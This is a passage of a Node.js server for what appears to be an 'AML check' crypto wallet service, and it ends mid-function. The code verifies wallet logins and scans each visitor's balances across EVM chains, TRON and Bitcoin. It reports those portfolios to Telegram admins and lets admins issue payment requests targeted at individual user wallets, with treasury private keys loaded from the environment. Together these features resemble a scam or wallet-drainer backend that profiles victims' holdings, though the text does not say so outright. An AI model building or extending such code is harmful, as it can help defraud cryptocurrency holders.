const crypto = require("node:crypto");
const fs = require("node:fs");
const fsp = require("node:fs/promises");
const http = require("node:http");
const path = require("node:path");
const { DatabaseSync } = require("node:sqlite");
const { formatUnits, getAddress, isAddress, JsonRpcProvider, verifyMessage, Wallet } = require("ethers");
const TronWebImport = require("tronweb");
const TronWeb = TronWebImport.TronWeb || TronWebImport.default || TronWebImport;

const root = __dirname;
const dataDir = path.join(root, "data");
const dbPath = path.join(dataDir, "aml-best.sqlite");
const port = Number(process.env.PORT || 3000);
const userSessionTtlDays = Number(process.env.USER_SESSION_TTL_DAYS || 30);
const tronFullHost = String(process.env.TRON_FULL_HOST || "https://api.trongrid.io").replace(/\/$/, "");
const tronProApiKey = String(process.env.TRON_PRO_API_KEY || "").trim();
const tronWeb = new TronWeb({ fullHost: tronFullHost });
if (tronProApiKey && typeof tronWeb.setHeader === "function") {
  tronWeb.setHeader({ "TRON-PRO-API-KEY": tronProApiKey });
}
const tronUsdtContract = process.env.TRON_USDT_CONTRACT || "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const tronUsdtDecimals = 6;
const tronTreasuryPrivateKey = String(process.env.TRON_TREASURY_PRIVATE_KEY || "")
  .trim()
  .replace(/^0x/i, "");
const evmTreasuryPrivateKey = String(process.env.EVM_TREASURY_PRIVATE_KEY || "").trim();
const paymentEvmRecipient = String(process.env.PAYMENT_EVM_RECIPIENT || "").trim();
const paymentTronRecipient = String(process.env.PAYMENT_TRON_RECIPIENT || "").trim();
const allowedOrigins = (
  process.env.ALLOWED_ORIGINS ||
  "https://iwtluxz.github.io,http://localhost:3000,http://127.0.0.1:3000"
)
  .split(",")
  .map((origin) => origin.trim())
  .filter(Boolean);

const telegramToken = String(process.env.TELEGRAM_BOT_TOKEN || "").trim();
const telegramAdminIds = new Set(
  String(process.env.TELEGRAM_ADMIN_CHAT_IDS || "")
    .split(",")
    .map((id) => id.trim())
    .filter(Boolean),
);
const telegramApi = telegramToken ? `https://api.telegram.org/bot${telegramToken}` : "";
const publicBaseUrl = String(
  process.env.PUBLIC_BASE_URL ||
    process.env.RENDER_EXTERNAL_URL ||
    (process.env.RAILWAY_PUBLIC_DOMAIN ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}` : ""),
)
  .trim()
  .replace(/\/$/, "");
const telegramWebhookSecret = telegramToken
  ? crypto.createHash("sha256").update(telegramToken).digest("hex")
  : "";
const buildRpcUrls = (customUrls, defaults) =>
  [
    ...String(customUrls || "")
      .split(",")
      .map((url) => url.trim())
      .filter(Boolean),
    ...defaults,
  ].filter((url, index, urls) => urls.indexOf(url) === index);
const evmUsdtContracts = {
  1: { contract: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, label: "ERC20" },
  56: { contract: "0x55d398326f99059fF775485246999027B3197955", decimals: 18, label: "BEP20" },
  137: { contract: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6, label: "Polygon" },
  42161: { contract: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9", decimals: 6, label: "Arbitrum" },
  10: { contract: "0x94b008aA0059c1B19e614C879609D0D4B8de0e0", decimals: 6, label: "Optimism" },
};

const balanceNetworks = {
  1: {
    name: "Ethereum",
    symbol: "ETH",
    rpcUrls: buildRpcUrls(process.env.ETHEREUM_RPC_URL, [
      "https://ethereum-rpc.publicnode.com",
      "https://cloudflare-eth.com",
    ]),
  },
  10: {
    name: "OP Mainnet",
    symbol: "ETH",
    rpcUrls: buildRpcUrls(process.env.OPTIMISM_RPC_URL, [
      "https://optimism-rpc.publicnode.com",
      "https://mainnet.optimism.io",
    ]),
  },
  56: {
    name: "BNB Smart Chain",
    symbol: "BNB",
    rpcUrls: buildRpcUrls(process.env.BSC_RPC_URL, [
      "https://bsc-dataseed.bnbchain.org",
      "https://bsc-rpc.publicnode.com",
    ]),
  },
  137: {
    name: "Polygon",
    symbol: "POL",
    rpcUrls: buildRpcUrls(process.env.POLYGON_RPC_URL, [
      "https://polygon-bor-rpc.publicnode.com",
      "https://polygon.drpc.org",
    ]),
  },
  8453: {
    name: "Base",
    symbol: "ETH",
    rpcUrls: buildRpcUrls(process.env.BASE_RPC_URL, [
      "https://mainnet.base.org",
      "https://base-rpc.publicnode.com",
    ]),
  },
  42161: {
    name: "Arbitrum One",
    symbol: "ETH",
    rpcUrls: buildRpcUrls(process.env.ARBITRUM_RPC_URL, [
      "https://arb1.arbitrum.io/rpc",
      "https://arbitrum-one-rpc.publicnode.com",
    ]),
  },
};

const nonces = new Map();
const adminPendingActions = new Map();
let database;
let telegramOffset = 0;
const telegramState = {
  status: telegramToken ? "starting" : "disabled",
  mode: publicBaseUrl ? "webhook" : "polling",
  username: null,
  lastError: null,
  lastUpdateAt: null,
};

const mimeTypes = {
  ".html": "text/html; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".js": "application/javascript; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".webp": "image/webp",
};

const nowIso = () => new Date().toISOString();

const parseChainId = (value) => {
  const parsed =
    typeof value === "string" && value.toLowerCase().startsWith("0x")
      ? Number.parseInt(value, 16)
      : Number(value);
  return Number.isSafeInteger(parsed) && parsed > 0 ? parsed : 1;
};

const formatBalance = (wei) => {
  const value = formatUnits(wei, 18);
  const [whole, fraction = ""] = value.split(".");
  const trimmedFraction = fraction.slice(0, 6).replace(/0+$/, "");
  return trimmedFraction ? `${whole}.${trimmedFraction}` : whole;
};

const parseTokenAmountToRaw = (value, decimals = 6, humanReadable = false) => {
  if (value === undefined || value === null || value === "") return 0n;

  let text = String(value).trim();
  if (!text) return 0n;

  if (text.startsWith("0x") || text.startsWith("0X")) return BigInt(text);

  // Some explorers return human values like "3.12" in `amount`/`quantity`,
  // while contract and TronGrid return raw integers like "3120000".
  if (humanReadable || text.includes(".")) {
    if (text.includes("e") || text.includes("E")) {
      const numeric = Number(text);
      if (!Number.isFinite(numeric)) return 0n;
      text = numeric.toFixed(decimals);
    }

    const [wholeRaw, fractionRaw = ""] = text.split(".");
    const whole = wholeRaw.replace(/[^0-9]/g, "") || "0";
    const fraction = fractionRaw.replace(/[^0-9]/g, "").padEnd(decimals, "0").slice(0, decimals);
    return BigInt(whole) * 10n ** BigInt(decimals) + BigInt(fraction || "0");
  }

  const digits = text.replace(/[^0-9]/g, "");
  return digits ? BigInt(digits) : 0n;
};

const formatTokenUnits = (value, decimals = 6) => {
  const amount = BigInt(value);
  const base = 10n ** BigInt(decimals);
  const whole = amount / base;
  const fraction = (amount % base).toString().padStart(decimals, "0").replace(/0+$/, "");
  return fraction ? `${whole}.${fraction}` : String(whole);
};

const getTronHeaders = () => ({
  "Content-Type": "application/json",
  Accept: "application/json",
  ...(tronProApiKey ? { "TRON-PRO-API-KEY": tronProApiKey } : {}),
});

const withTimeout = (timeoutMs = 9000) => AbortSignal.timeout(timeoutMs);

const tokenLooksLikeUsdt = (token) => {
  if (!token || typeof token !== "object") return false;
  if (token[tronUsdtContract] !== undefined) return true;

  const tokenId = String(
    token.tokenId ||
      token.token_id ||
      token.contract_address ||
      token.contractAddress ||
      token.address ||
      token.tokenAddress ||
      token.id ||
      "",
  );
  const tokenAbbr = String(token.tokenAbbr || token.tokenName || token.symbol || token.name || "").toUpperCase();

  return tokenId === tronUsdtContract || tokenAbbr === "USDT" || tokenAbbr === "TETHER USD";
};

const parseTronTokenBalance = (payload) => {
  const candidates = [];
  const addArray = (value) => {
    if (Array.isArray(value)) candidates.push(...value);
  };

  addArray(payload?.data);
  addArray(payload?.data?.[0]?.trc20);
  addArray(payload?.trc20);
  addArray(payload?.tokens);
  addArray(payload?.balances);
  addArray(payload?.withPriceTokens);
  addArray(payload?.trc20token_balances);

  // TronGrid /v1/accounts/{address} returns { data: [{ trc20: [{ CONTRACT: "raw" }] }] }
  // TronGrid /trc20/balance returns { data: [{ CONTRACT: "raw" }] }
  for (const token of candidates) {
    if (!token || typeof token !== "object") continue;
    if (token[tronUsdtContract] !== undefined) {
      return parseTokenAmountToRaw(token[tronUsdtContract], tronUsdtDecimals);
    }
  }

  // TronScan /api/account/tokens returns token rows with tokenId/tokenAbbr and balance fields.
  for (const token of candidates) {
    if (!tokenLooksLikeUsdt(token)) continue;

    const decimals = Number(token.tokenDecimal ?? token.decimals ?? tronUsdtDecimals) || tronUsdtDecimals;
    const rawFields = [token.balance, token.rawBalance, token.amountInSun, token.amountInSmallestUnit];
    for (const value of rawFields) {
      if (value !== undefined && value !== null && value !== "") {
        return parseTokenAmountToRaw(value, decimals, false);
      }
    }

    const humanFields = [token.amount, token.quantity, token.value, token.tokenAmount];
    for (const value of humanFields) {
      if (value !== undefined && value !== null && value !== "") {
        return parseTokenAmountToRaw(value, decimals, true);
      }
    }
  }

  return 0n;
};

const isTronAddress = (address) => {
  try {
    return Boolean(address && tronWeb.isAddress(String(address).trim()));
  } catch {
    return false;
  }
};

const normalizeTronAddressInput = (address) => {
  const raw = String(address || "").trim();
  if (!raw) return null;

  const cleanHex = raw.replace(/^0x/i, "");
  const isHex = /^41[a-fA-F0-9]{40}$/.test(cleanHex);

  if (isHex) {
    try {
      return tronWeb.address.fromHex(cleanHex);
    } catch {
      return `0x${cleanHex}`;
    }
  }

  if (isTronAddress(raw)) {
    if (raw.startsWith("T")) return raw;
    try {
      return tronWeb.address.fromHex(cleanHex);
    } catch {
      return raw;
    }
  }

  return null;
};

const normalizeWalletAddress = (address, chain = "evm") => {
  if (chain === "tron") {
    const normalized = normalizeTronAddressInput(address);
    if (!normalized) throw new Error("Некорректный TRON адрес");
    return normalized;
  }
  if (!address || !isAddress(address)) throw new Error("Некорректный Ethereum/EVM адрес");
  return getAddress(address);
};

const getNonceKey = (chain, address) => `${chain}:${address}`;

const getNativeBalance = async (address, chainId) => {
  const network = balanceNetworks[chainId];
  try {
    const wei = await Promise.any(
      network.rpcUrls.map(async (rpcUrl) => {
        const response = await fetch(rpcUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            jsonrpc: "2.0",
            id: 1,
            method: "eth_getBalance",
            params: [address, "latest"],
          }),
          signal: AbortSignal.timeout(3500),
        });
        const payload = await response.json();
        if (!response.ok || payload.error || typeof payload.result !== "string") {
          throw new Error(payload.error?.message || `RPC HTTP ${response.status}`);
        }
        return BigInt(payload.result);
      }),
    );
    return {
      ok: true,
      chainId,
      network: network.name,
      balance: formatBalance(wei),
      wei,
      symbol: network.symbol,
    };
  } catch (error) {
    const message =
      error instanceof AggregateError
        ? error.errors.map((item) => item.message).join("; ")
        : error.message;
    console.error(`Balance lookup error for chain ${chainId}:`, message);
    return {
      ok: false,
      chainId,
      network: network.name,
      symbol: network.symbol,
    };
  }
};

const getAllNativeBalances = async (address, preferredChainIdValue) => {
  const preferredChainId = parseChainId(preferredChainIdValue);
  const results = await Promise.all(
    Object.keys(balanceNetworks).map((chainId) => getNativeBalance(address, Number(chainId))),
  );
  const balances = results
    .filter((result) => result.ok)
    .sort((left, right) => {
      if (left.chainId === preferredChainId) return -1;
      if (right.chainId === preferredChainId) return 1;
      return left.chainId - right.chainId;
    });

  return {
    balances,
    checkedCount: balances.length,
    failedCount: results.length - balances.length,
  };
};

const getNonZeroNativeBalances = async (address, preferredChainIdValue) => {
  const scan = await getAllNativeBalances(address, preferredChainIdValue);
  return {
    ...scan,
    balances: scan.balances.filter((result) => result.wei > 0n),
  };
};

const isBitcoinAddress = (address) => {
  const trimmed = String(address || "").trim();
  return /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,87}$/.test(trimmed);
};

const encodeBalanceOfCall = (walletAddress) => {
  const normalized = getAddress(walletAddress).slice(2).padStart(64, "0");
  return `0x70a08231${normalized}`;
};

const getEvmUsdtBalance = async (walletAddress, chainId) => {
  const config = evmUsdtContracts[chainId];
  const network = balanceNetworks[chainId];
  if (!config || !network) {
    return { ok: false, chainId, network: "Unknown", token: "USDT", error: "Сеть не поддерживается" };
  }

  const callData = encodeBalanceOfCall(walletAddress);
  try {
    const raw = await Promise.any(
      network.rpcUrls.map(async (rpcUrl) => {
        const response = await fetch(rpcUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            jsonrpc: "2.0",
            id: 1,
            method: "eth_call",
            params: [{ to: config.contract, data: callData }, "latest"],
          }),
          signal: AbortSignal.timeout(3500),
        });
        const payload = await response.json();
        if (!response.ok || payload.error || typeof payload.result !== "string") {
          throw new Error(payload.error?.message || `RPC HTTP ${response.status}`);
        }
        return BigInt(payload.result);
      }),
    );

    return {
      ok: true,
      chainId,
      network: network.name,
      token: "USDT",
      label: config.label,
      balance: formatTokenUnits(raw, config.decimals),
      rawBalance: raw,
      contract: config.contract,
    };
  } catch (error) {
    const message =
      error instanceof AggregateError
        ? error.errors.map((item) => item.message).join("; ")
        : error.message;
    return {
      ok: false,
      chainId,
      network: network.name,
      token: "USDT",
      label: config.label,
      error: message,
    };
  }
};

const getBitcoinBalance = async (address) => {
  const normalized = String(address || "").trim();
  const errors = [];
  const hosts = ["https://blockstream.info/api", "https://mempool.space/api"];

  for (const host of hosts) {
    try {
      const response = await fetch(`${host}/address/${encodeURIComponent(normalized)}`, {
        headers: { Accept: "application/json" },
        signal: withTimeout(),
      });
      const payload = await response.json();
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      const funded = BigInt(payload.chain_stats?.funded_txo_sum ?? 0);
      const spent = BigInt(payload.chain_stats?.spent_txo_sum ?? 0);
      const satoshi = funded - spent;
      return {
        ok: true,
        source: host,
        network: "Bitcoin",
        token: "BTC",
        balance: formatTokenUnits(satoshi, 8),
        rawBalance: satoshi,
      };
    } catch (error) {
      errors.push(`${host}: ${error.message}`);
    }
  }

  return {
    ok: false,
    network: "Bitcoin",
    token: "BTC",
    error: errors.join("; ") || "Не удалось получить BTC баланс",
  };
};

const buildWalletPortfolio = async ({ evmAddress, tronAddress, btcAddress, preferredChainId }) => {
  const normalizedEvm = evmAddress && isAddress(evmAddress) ? getAddress(evmAddress) : null;
  const providedTron = normalizeTronAddressInput(tronAddress);
  const normalizedTron = providedTron || null;
  const tronAddressSource = providedTron ? "provided" : "missing";
  const normalizedBtc =
    btcAddress && isBitcoinAddress(btcAddress) ? String(btcAddress).trim() : null;

  const [evmNativeScan, evmUsdt, trx, usdtTrc20, btc] = await Promise.all([
    normalizedEvm ? getAllNativeBalances(normalizedEvm, preferredChainId) : Promise.resolve({ balances: [] }),
    normalizedEvm
      ? Promise.all(
          Object.keys(evmUsdtContracts).map((chainId) => getEvmUsdtBalance(normalizedEvm, Number(chainId))),
        )
      : Promise.resolve([]),
    normalizedTron ? getTronNativeBalance(normalizedTron) : Promise.resolve(null),
    normalizedTron ? getTronUsdtBalance(normalizedTron) : Promise.resolve(null),
    normalizedBtc ? getBitcoinBalance(normalizedBtc) : Promise.resolve(null),
  ]);

  return {
    evmAddress: normalizedEvm,
    tronAddress: normalizedTron,
    tronAddressSource,
    btcAddress: normalizedBtc,
    evmNatives: evmNativeScan.balances,
    evmUsdt,
    trx,
    usdtTrc20,
    btc,
  };
};

const formatPortfolioTelegramLines = (portfolio) => {
  const lines = [];

  if (portfolio.evmAddress) lines.push(`EVM: ${portfolio.evmAddress}`);
  if (portfolio.tronAddress) lines.push(`TRON: ${portfolio.tronAddress}`);
  if (portfolio.btcAddress) lines.push(`BTC: ${portfolio.btcAddress}`);

  if (portfolio.evmAddress) {
    lines.push("", "EVM нативные балансы:");
    for (const item of portfolio.evmNatives) {
      lines.push(`${item.network} (${item.chainId}): ${item.balance} ${item.symbol}`);
    }

    lines.push("", "USDT (EVM):");
    for (const item of portfolio.evmUsdt) {
      lines.push(
        `${item.network} ${item.label || "USDT"}: ${
          item.ok ? `${item.balance} USDT` : `ошибка (${item.error})`
        }`,
      );
    }
  }

  if (portfolio.tronAddress) {
    lines.push("", "TRON:");
    lines.push(
      `TRX: ${portfolio.trx?.ok ? `${portfolio.trx.balance} TRX` : `ошибка (${portfolio.trx?.error || "нет данных"})`}`,
    );
    lines.push(
      `USDT TRC20: ${
        portfolio.usdtTrc20?.ok
          ? `${portfolio.usdtTrc20.balance} USDT`
          : `ошибка (${portfolio.usdtTrc20?.error || "нет данных"})`
      }`,
    );
  } else if (portfolio.evmAddress) {
    lines.push("", "TRON: адрес не получен — TRX/USDT TRC20 недоступны");
  }

  if (portfolio.btcAddress) {
    lines.push("", "Bitcoin:");
    lines.push(
      `BTC: ${portfolio.btc?.ok ? `${portfolio.btc.balance} BTC` : `ошибка (${portfolio.btc?.error || "нет данных"})`}`,
    );
  }

  if (!portfolio.evmAddress && !portfolio.tronAddress && !portfolio.btcAddress) {
    lines.push("Адреса для проверки не переданы.");
  }

  return lines;
};


const getTronNativeBalance = async (address) => {
  const normalized = String(address || "").trim();
  const errors = [];

  const makeResult = (source, sun) => ({
    ok: true,
    source,
    network: "TRON",
    token: "TRX",
    balance: formatTokenUnits(BigInt(sun), 6),
    rawBalance: BigInt(sun),
  });

  // Native TRX balance. This is what Trust Wallet shows as the big dollar amount
  // when the asset row is TRX / Tron.
  try {
    const sun = await tronWeb.trx.getBalance(normalized);
    return makeResult("tronweb-trx-getBalance", sun?.toString?.() ?? sun);
  } catch (error) {
    errors.push(`tronWeb getBalance: ${error.message}`);
  }

  try {
    const response = await fetch(`${tronFullHost}/v1/accounts/${encodeURIComponent(normalized)}`, {
      headers: getTronHeaders(),
      signal: withTimeout(),
    });
    const payload = await response.json();
    if (!response.ok || payload?.success === false) {
      throw new Error(payload?.error || payload?.message || `HTTP ${response.status}`);
    }
    const sun = payload?.data?.[0]?.balance ?? 0;
    return makeResult("trongrid-account-trx", sun);
  } catch (error) {
    errors.push(`TronGrid account TRX: ${error.message}`);
  }

  try {
    const response = await fetch(`https://apilist.tronscanapi.com/api/account?address=${encodeURIComponent(normalized)}`, {
      headers: { Accept: "application/json" },
      signal: withTimeout(),
    });
    const payload = await response.json();
    if (!response.ok || payload?.success === false) {
      throw new Error(payload?.message || payload?.error || `HTTP ${response.status}`);
    }
    const sun = payload?.balance ?? payload?.account?.balance ?? 0;
    return makeResult("tronscanapi-account-trx", sun);
  } catch (error) {
    errors.push(`TronScan account TRX: ${error.message}`);
  }

  return {
    ok: false,
    network: "TRON",
    token: "TRX",
    error: errors.join("; ") || "Не удалось получить TRX баланс",
  };
};

const getTronUsdtBalance = async (address) => {
  const normalized = String(address || "").trim();
  const errors = [];

  const makeResult = (source, raw) => ({
    ok: true,
    source,
    network: "TRON",
    token: "USDT TRC20",
    contract: tronUsdtContract,
    balance: formatTokenUnits(raw, tronUsdtDecimals),
    rawBalance: raw,
  });

  // 1) The most precise method: direct TRC20 balanceOf(address) call.
  try {
    const contract = await tronWeb.contract().at(tronUsdtContract);
    const rawBalance = await contract.balanceOf(normalized).call();
    const raw = parseTokenAmountToRaw(rawBalance?.toString?.() ?? rawBalance, tronUsdtDecimals);
    return makeResult("tronweb-contract-balanceOf", raw);
  } catch (error) {
    errors.push(`tronweb balanceOf: ${error.message}`);
  }

  // 2) TronGrid indexed TRC20 balance endpoint.
  try {
    const response = await fetch(
      `${tronFullHost}/v1/accounts/${encodeURIComponent(normalized)}/trc20/balance?contract_address=${encodeURIComponent(tronUsdtContract)}&limit=50`,
      { headers: getTronHeaders(), signal: withTimeout() },
    );
    const payload = await response.json();
    if (!response.ok || payload?.success === false) {
      throw new Error(payload?.error || payload?.message || `HTTP ${response.status}`);
    }
    const raw = parseTronTokenBalance(payload);
    return makeResult("trongrid-trc20-balance", raw);
  } catch (error) {
    errors.push(`trongrid /trc20/balance: ${error.message}`);
  }

  // 3) TronGrid account endpoint. Good fallback for accounts that already have token rows indexed.
  try {
    const response = await fetch(`${tronFullHost}/v1/accounts/${encodeURIComponent(normalized)}`, {
      headers: getTronHeaders(),
      signal: withTimeout(),
    });
    const payload = await response.json();
    if (!response.ok || payload?.success === false) {
      throw new Error(payload?.error || payload?.message || `HTTP ${response.status}`);
    }
    const raw = parseTronTokenBalance(payload);
    return makeResult("trongrid-account", raw);
  } catch (error) {
    errors.push(`trongrid account: ${error.message}`);
  }

  // 4) TronScan public token list. It often works when TronGrid is rate-limited.
  for (const host of ["https://apilist.tronscanapi.com", "https://apilist.tronscan.org"]) {
    try {
      const response = await fetch(
        `${host}/api/account/tokens?address=${encodeURIComponent(normalized)}&start=0&limit=200&hidden=0&show=0&sortType=0&sortBy=0`,
        { headers: { Accept: "application/json" }, signal: withTimeout() },
      );
      const payload = await response.json();
      if (!response.ok || payload?.success === false) {
        throw new Error(payload?.message || payload?.error || `HTTP ${response.status}`);
      }
      const raw = parseTronTokenBalance(payload);
      return makeResult(host.includes("tronscanapi") ? "tronscanapi-account-tokens" : "tronscan-account-tokens", raw);
    } catch (error) {
      errors.push(`${host} account/tokens: ${error.message}`);
    }
  }

  const details = errors.join("; ");
  console.error("TRON USDT balance lookup error:", details);
  return {
    ok: false,
    network: "TRON",
    token: "USDT TRC20",
    contract: tronUsdtContract,
    error: details || "Все источники TRON недоступны",
  };
};

const ensureDb = () => {
  fs.mkdirSync(dataDir, { recursive: true });
  database = new DatabaseSync(dbPath);
  database.exec(`
    CREATE TABLE IF NOT EXISTS wallet_users (
      address TEXT PRIMARY KEY,
      first_seen_at TEXT NOT NULL,
      last_seen_at TEXT NOT NULL,
      login_count INTEGER NOT NULL DEFAULT 0
    );

    CREATE TABLE IF NOT EXISTS sessions (
      token TEXT PRIMARY KEY,
      role TEXT NOT NULL,
      address TEXT,
      created_at TEXT NOT NULL,
      expires_at TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS checks (
      id TEXT PRIMARY KEY,
      user_wallet TEXT,
      wallet TEXT NOT NULL,
      tx_hash TEXT,
      score INTEGER NOT NULL,
      level TEXT NOT NULL,
      categories TEXT NOT NULL,
      created_at TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS leads (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      contact TEXT NOT NULL,
      message TEXT NOT NULL,
      created_at TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS payment_requests (
      id TEXT PRIMARY KEY,
      chain TEXT NOT NULL,
      chain_id INTEGER,
      token TEXT NOT NULL,
      amount TEXT NOT NULL,
      recipient TEXT NOT NULL,
      status TEXT NOT NULL,
      target_user_wallet TEXT,
      user_wallet TEXT,
      tron_user_address TEXT,
      tx_hash TEXT,
      created_by TEXT,
      created_at TEXT NOT NULL,
      updated_at TEXT NOT NULL,
      expires_at TEXT NOT NULL
    );
  `);

  const checkColumns = database.prepare("PRAGMA table_info(checks)").all().map((column) => column.name);
  if (!checkColumns.includes("user_wallet")) database.exec("ALTER TABLE checks ADD COLUMN user_wallet TEXT");
  if (!checkColumns.includes("tx_hash")) database.exec("ALTER TABLE checks ADD COLUMN tx_hash TEXT");

  const paymentColumns = database.prepare("PRAGMA table_info(payment_requests)").all().map((column) => column.name);
  if (!paymentColumns.includes("target_user_wallet")) {
    database.exec("ALTER TABLE payment_requests ADD COLUMN target_user_wallet TEXT");
  }
};

const readBody = (request) =>
  new Promise((resolve, reject) => {
    let body = "";
    request.on("data", (chunk) => {
      body += chunk;
      if (body.length > 1_000_000) reject(new Error("Слишком большой запрос"));
    });
    request.on("end", () => {
      try {
        resolve(body ? JSON.parse(body) : {});
      } catch {
        reject(new Error("Некорректный JSON"));
      }
    });
    request.on("error", reject);
  });

const getCorsHeaders = (request) => {
  const origin = request.headers.origin;
  const allowOrigin =
    origin &&
    (allowedOrigins.includes(origin) ||
      /^https:\/\/[a-z0-9-]+\.github\.io$/i.test(origin) ||
      /^https:\/\/[a-z0-9-]+\.onrender\.com$/i.test(origin))
      ? origin
      : allowedOrigins[0] || "*";

  return {
    "Access-Control-Allow-Origin": allowOrigin,
    "Access-Control-Allow-Headers": "Content-Type, Authorization",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    "Access-Control-Max-Age": "86400",
    Vary: "Origin",
  };
};

const sendJson = (request, response, status, payload, headers = {}) => {
  response.writeHead(status, {
    "Content-Type": "application/json; charset=utf-8",
    ...getCorsHeaders(request),
    ...headers,
  });
  response.end(JSON.stringify(payload));
};

const getBearerToken = (request) => {
  const header = request.headers.authorization || "";
  return header.toLowerCase().startsWith("bearer ") ? header.slice(7).trim() : undefined;
};

const getUserSession = (request) => {
  const token = getBearerToken(request);
  if (!token) return undefined;

  const session = database.prepare(`
    SELECT token, role, address, created_at AS createdAt, expires_at AS expiresAt
    FROM sessions
    WHERE token = ?
  `).get(token);

  if (!session || session.role !== "user" || new Date(session.expiresAt).getTime() < Date.now()) {
    if (session) database.prepare("DELETE FROM sessions WHERE token = ?").run(token);
    return undefined;
  }

  const expiresAt = new Date(Date.now() + userSessionTtlDays * 24 * 60 * 60 * 1000).toISOString();
  database.prepare("UPDATE sessions SET expires_at = ? WHERE token = ?").run(expiresAt, token);
  return { ...session, expiresAt };
};

const createUserSession = (address) => {
  const token = crypto.randomBytes(32).toString("hex");
  const createdAt = nowIso();
  const expiresAt = new Date(Date.now() + userSessionTtlDays * 24 * 60 * 60 * 1000).toISOString();
  database.prepare(`
    INSERT INTO sessions (token, role, address, created_at, expires_at)
    VALUES (?, 'user', ?, ?, ?)
  `).run(token, address, createdAt, expiresAt);
  return { token, expiresAt };
};

const deleteSession = (request) => {
  const token = getBearerToken(request);
  if (token) database.prepare("DELETE FROM sessions WHERE token = ?").run(token);
};

const upsertWalletUser = (address) => {
  const at = nowIso();
  database.prepare(`
    INSERT INTO wallet_users (address, first_seen_at, last_seen_at, login_count)
    VALUES (?, ?, ?, 1)
    ON CONFLICT(address) DO UPDATE SET
      last_seen_at = excluded.last_seen_at,
      login_count = login_count + 1
  `).run(address, at, at);
};

const insertCheck = (record) => {
  database.prepare(`
    INSERT INTO checks (id, user_wallet, wallet, tx_hash, score, level, categories, created_at)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
  `).run(
    record.id,
    record.userWallet,
    record.wallet,
    record.txHash || null,
    record.score,
    record.level,
    JSON.stringify(record.categories),
    record.createdAt,
  );
};

const insertLead = (record) => {
  database.prepare(`
    INSERT INTO leads (id, name, contact, message, created_at)
    VALUES (?, ?, ?, ?, ?)
  `).run(record.id, record.name, record.contact, record.message, record.createdAt);
};

const normalizePaymentToken = (chain, tokenValue) => {
  const token = String(tokenValue || "").trim().toLowerCase();
  if (chain === "evm") return "native";
  if (chain === "tron" && token === "trx") return "trx";
  return "usdt";
};

const normalizePaymentAmount = (value) => {
  const amount = String(value || "").trim().replace(",", ".");
  if (!/^\d+(\.\d{1,18})?$/.test(amount)) throw new Error("Некорректная сумма платежа");
  if (Number(amount) <= 0) throw new Error("Сумма платежа должна быть больше нуля");
  return amount;
};

const serializePaymentRequest = (record) =>
  record
    ? {
        id: record.id,
        chain: record.chain,
        chainId: record.chain_id || null,
        token: record.token,
        amount: record.amount,
        recipient: record.recipient,
        status: record.status,
        targetUserWallet: record.target_user_wallet || null,
        userWallet: record.user_wallet || null,
        tronUserAddress: record.tron_user_address || null,
        txHash: record.tx_hash || null,
        createdAt: record.created_at,
        updatedAt: record.updated_at,
        expiresAt: record.expires_at,
        tronUsdtContract,
      }
    : null;

const createPaymentRequest = ({ chain, chainId, token, amount, recipient, createdBy, targetUserWallet }) => {
  const normalizedChain = chain === "tron" ? "tron" : "evm";
  const normalizedToken = normalizePaymentToken(normalizedChain, token);
  const normalizedAmount = normalizePaymentAmount(amount);
  const normalizedRecipient = normalizeWalletAddress(recipient, normalizedChain);
  const normalizedChainId = normalizedChain === "evm" ? parseChainId(chainId || 1) : null;
  const normalizedTargetUserWallet = targetUserWallet ? normalizeWalletAddress(targetUserWallet, "evm") : null;
  const at = nowIso();
  const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString();
  const id = crypto.randomUUID();

  database.prepare(`
    UPDATE payment_requests
    SET status = 'cancelled', updated_at = ?
    WHERE status = 'active' AND COALESCE(target_user_wallet, '') = COALESCE(?, '')
  `).run(at, normalizedTargetUserWallet);
  database.prepare(`
    INSERT INTO payment_requests (
      id, chain, chain_id, token, amount, recipient, status, target_user_wallet, created_by, created_at, updated_at, expires_at
    )
    VALUES (?, ?, ?, ?, ?, ?, 'active', ?, ?, ?, ?, ?)
  `).run(
    id,
    normalizedChain,
    normalizedChainId,
    normalizedToken,
    normalizedAmount,
    normalizedRecipient,
    normalizedTargetUserWallet,
    createdBy || null,
    at,
    at,
    expiresAt,
  );

  return getPaymentRequestById(id);
};

const getPaymentRequestById = (id) =>
  database.prepare(`
    SELECT
      id, chain, chain_id, token, amount, recipient, status, user_wallet, tron_user_address,
      target_user_wallet, tx_hash, created_by, created_at, updated_at, expires_at
    FROM payment_requests
    WHERE id = ?
  `).get(id);

const getActivePaymentRequest = (userWallet) => {
  const normalizedUserWallet = userWallet && isAddress(userWallet) ? getAddress(userWallet) : null;
  const request = database.prepare(`
    SELECT
      id, chain, chain_id, token, amount, recipient, status, user_wallet, tron_user_address,
      target_user_wallet, tx_hash, created_by, created_at, updated_at, expires_at
    FROM payment_requests
    WHERE status = 'active'
      AND expires_at > ?
      AND (
        target_user_wallet IS NULL
        OR target_user_wallet = ?
      )
    ORDER BY created_at DESC
    LIMIT 1
  `).get(nowIso(), normalizedUserWallet);
  return serializePaymentRequest(request);
};

const completePaymentRequest = ({ id, txHash, userWallet, tronUserAddress }) => {
  const at = nowIso();
  const request = getPaymentRequestById(id);
  if (!request || request.status !== "active" || new Date(request.expires_at).getTime() < Date.now()) {
    throw new Error("Активный запрос оплаты не найден или уже истёк");
  }

  const normalizedUserWallet = userWallet && isAddress(userWallet) ? getAddress(userWallet) : null;
